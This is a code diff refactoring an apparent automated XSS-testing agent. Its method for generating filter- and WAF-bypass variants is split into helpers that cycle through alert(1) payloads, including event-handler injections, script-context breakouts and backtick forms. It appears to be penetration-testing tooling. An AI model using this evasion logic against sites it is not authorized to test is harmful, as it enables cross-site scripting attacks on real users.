@@ -3123,115 +3123,108 @@ Return JSON:
         # Devolver el primero (en una implementación más avanzada, tendría más lógica)
         return csp_bypass_payloads[0]
 
-    async def generate_bypass_variant(
+    def _bypass_try_waf_encoding(
         self,
         original_payload: str,
-        failure_reason: str,
-        waf_signature: Optional[str] = None,
-        stripped_chars: Optional[str] = None,
-        detected_context: Optional[str] = None,
-        tried_variants: Optional[List[str]] = None
+        waf_signature: str,
+        tried_variants: List[str]
     ) -> Optional[str]:
-        """
-        Genera una variante de payload XSS basada en feedback de fallo.
-        
-        Este método es llamado por el AgenticValidator cuando un payload falla,
-        permitiendo al agente usar su lógica sofisticada de bypass para generar
-        una variante que evite el problema detectado.
-        
-        Args:
-            original_payload: El payload que falló
-            failure_reason: Razón del fallo (waf_blocked, chars_filtered, etc.)
-            waf_signature: Firma del WAF detectado (si aplica)
-            stripped_chars: Caracteres que fueron filtrados
-            detected_context: Contexto HTML donde se reflejó
-            tried_variants: Lista de variantes ya probadas
-            
-        Returns:
-            String con el nuevo payload, o None si no se pudo generar
-        """
-        logger.info(f"[XSSAgent] Generating bypass variant for failed payload: {original_payload[:50]}...")
-        
-        tried_variants = tried_variants or []
-        
-        # Estrategia 1: Si hay WAF detectado, usar encoding inteligente
-        if waf_signature and waf_signature.lower() != "no identificado":
-            logger.info(f"[XSSAgent] WAF detected ({waf_signature}), using intelligent encoding...")
-            
-            # Usar el sistema de Q-Learning para generar variantes optimizadas
-            encoded_variants = self._get_waf_optimized_payloads([original_payload], max_variants=5)
-            
-            # Filtrar las que ya se probaron
-            for variant in encoded_variants:
-                if variant not in tried_variants and variant != original_payload:
-                    logger.info(f"[XSSAgent] Generated WAF bypass variant: {variant[:80]}...")
-                    return variant
-        
-        # Estrategia 2: Si hay caracteres filtrados, usar técnicas de ofuscación
-        if stripped_chars:
-            logger.info(f"[XSSAgent] Characters filtered ({stripped_chars}), using obfuscation...")
-            
-            # Técnicas de bypass comunes
-            bypass_techniques = []
-            
-            # Si filtran '<' y '>', probar con event handlers
-            if '<' in stripped_chars or '>' in stripped_chars:
-                bypass_techniques.extend([
-                    f'" autofocus onfocus=alert(1) x="',
-                    f'" onload=alert(1) x="',
-                    f'" onerror=alert(1) x="',
-                ])
-            
-            # Si filtran 'script', probar alternativas
-            if 'script' in stripped_chars.lower():
-                bypass_techniques.extend([
-                    '<img src=x onerror=alert(1)>',
-                    '<svg onload=alert(1)>',
-                    '<body onload=alert(1)>',
-                ])
-            
-            # Si filtran paréntesis, usar backticks
-            if '(' in stripped_chars or ')' in stripped_chars:
-                bypass_techniques.extend([
-                    '<img src=x onerror=alert`1`>',
-                    '<svg onload=alert`1`>',
-                ])
-            
-            for variant in bypass_techniques:
-                if variant not in tried_variants:
-                    logger.info(f"[XSSAgent] Generated obfuscation variant: {variant[:80]}...")
-                    return variant
-        
-        # Estrategia 3: Si hay contexto detectado, usar payloads específicos
-        if detected_context:
-            context_lower = detected_context.lower()
-            context_specific = []
-            
-            if 'attribute' in context_lower or 'attr' in context_lower:
-                context_specific.extend([
-                    '" autofocus onfocus=alert(1) x="',
-                    "' autofocus onfocus=alert(1) x='",
-                    '" onmouseover=alert(1) x="',
-                ])
-            elif 'script' in context_lower:
-                context_specific.extend([
-                    '</script><img src=x onerror=alert(1)>',
-                    '-alert(1)-',
-                    ';alert(1);//',
-                ])
-            elif 'html' in context_lower or 'body' in context_lower:
-                context_specific.extend([
-                    '<img src=x onerror=alert(1)>',
-                    '<svg onload=alert(1)>',
-                    '<iframe onload=alert(1)>',
-                ])
-            
-            for variant in context_specific:
-                if variant not in tried_variants:
-                    logger.info(f"[XSSAgent] Generated context-specific variant: {variant[:80]}...")
-                    return variant
-        
-        # Estrategia 4: Fallback a payloads universales avanzados
+        """Generate WAF bypass variant using Q-Learning encoding."""
+        if not waf_signature or waf_signature.lower() == "no identificado":
+            return None
+
+        logger.info(f"[XSSAgent] WAF detected ({waf_signature}), using intelligent encoding...")
+        encoded_variants = self._get_waf_optimized_payloads([original_payload], max_variants=5)
+
+        for variant in encoded_variants:
+            if variant not in tried_variants and variant != original_payload:
+                logger.info(f"[XSSAgent] Generated WAF bypass variant: {variant[:80]}...")
+                return variant
+        return None
+
+    def _bypass_try_char_obfuscation(
+        self,
+        stripped_chars: str,
+        tried_variants: List[str]
+    ) -> Optional[str]:
+        """Generate bypass variant using character obfuscation techniques."""
+        if not stripped_chars:
+            return None
+
+        logger.info(f"[XSSAgent] Characters filtered ({stripped_chars}), using obfuscation...")
+        bypass_techniques = []
+
+        # Si filtran '<' y '>', probar con event handlers
+        if '<' in stripped_chars or '>' in stripped_chars:
+            bypass_techniques.extend([
+                f'" autofocus onfocus=alert(1) x="',
+                f'" onload=alert(1) x="',
+                f'" onerror=alert(1) x="',
+            ])
+
+        # Si filtran 'script', probar alternativas
+        if 'script' in stripped_chars.lower():
+            bypass_techniques.extend([
+                '<img src=x onerror=alert(1)>',
+                '<svg onload=alert(1)>',
+                '<body onload=alert(1)>',
+            ])
+
+        # Si filtran paréntesis, usar backticks
+        if '(' in stripped_chars or ')' in stripped_chars:
+            bypass_techniques.extend([
+                '<img src=x onerror=alert`1`>',
+                '<svg onload=alert`1`>',
+            ])
+
+        for variant in bypass_techniques:
+            if variant not in tried_variants:
+                logger.info(f"[XSSAgent] Generated obfuscation variant: {variant[:80]}...")
+                return variant
+        return None
+
+    def _bypass_try_context_specific(
+        self,
+        detected_context: str,
+        tried_variants: List[str]
+    ) -> Optional[str]:
+        """Generate bypass variant based on detected HTML context."""
+        if not detected_context:
+            return None
+
+        context_lower = detected_context.lower()
+        context_specific = []
+
+        if 'attribute' in context_lower or 'attr' in context_lower:
+            context_specific.extend([
+                '" autofocus onfocus=alert(1) x="',
+                "' autofocus onfocus=alert(1) x='",
+                '" onmouseover=alert(1) x="',
+            ])
+        elif 'script' in context_lower:
+            context_specific.extend([
+                '</script><img src=x onerror=alert(1)>',
+                '-alert(1)-',
+                ';alert(1);//',
+            ])
+        elif 'html' in context_lower or 'body' in context_lower:
+            context_specific.extend([
+                '<img src=x onerror=alert(1)>',
+                '<svg onload=alert(1)>',
+                '<iframe onload=alert(1)>',
+            ])
+
+        for variant in context_specific:
+            if variant not in tried_variants:
+                logger.info(f"[XSSAgent] Generated context-specific variant: {variant[:80]}...")
+                return variant
+        return None
+
+    def _bypass_try_universal_payloads(
+        self,
+        tried_variants: List[str]
+    ) -> Optional[str]:
+        """Generate universal bypass payloads as fallback."""
         universal_advanced = [
             '<img src=x onerror=alert(1)>',
             '<svg/onload=alert(1)>',
@@ -3244,12 +3237,60 @@ Return JSON:
             '<video><source onerror=alert(1)>',
             '<audio src=x onerror=alert(1)>',
         ]
-        
+
         for variant in universal_advanced:
             if variant not in tried_variants:
                 logger.info(f"[XSSAgent] Generated universal variant: {variant[:80]}...")
                 return variant
-        
+        return None
+
+    async def generate_bypass_variant(
+        self,
+        original_payload: str,
+        failure_reason: str,
+        waf_signature: Optional[str] = None,
+        stripped_chars: Optional[str] = None,
+        detected_context: Optional[str] = None,
+        tried_variants: Optional[List[str]] = None
+    ) -> Optional[str]:
+        """
+        Genera una variante de payload XSS basada en feedback de fallo.
+
+        Este método es llamado por el AgenticValidator cuando un payload falla,
+        permitiendo al agente usar su lógica sofisticada de bypass para generar
+        una variante que evite el problema detectado.
+
+        Args:
+            original_payload: El payload que falló
+            failure_reason: Razón del fallo (waf_blocked, chars_filtered, etc.)
+            waf_signature: Firma del WAF detectado (si aplica)
+            stripped_chars: Caracteres que fueron filtrados
+            detected_context: Contexto HTML donde se reflejó
+            tried_variants: Lista de variantes ya probadas
+
+        Returns:
+            String con el nuevo payload, o None si no se pudo generar
+        """
+        logger.info(f"[XSSAgent] Generating bypass variant for failed payload: {original_payload[:50]}...")
+        tried_variants = tried_variants or []
+
+        # Try each bypass strategy in order
+        variant = self._bypass_try_waf_encoding(original_payload, waf_signature, tried_variants)
+        if variant:
+            return variant
+
+        variant = self._bypass_try_char_obfuscation(stripped_chars, tried_variants)
+        if variant:
+            return variant
+
+        variant = self._bypass_try_context_specific(detected_context, tried_variants)
+        if variant:
+            return variant
+
+        variant = self._bypass_try_universal_payloads(tried_variants)
+        if variant:
+            return variant
+
         logger.warning("[XSSAgent] Could not generate new variant (all strategies exhausted)")
         return None
 
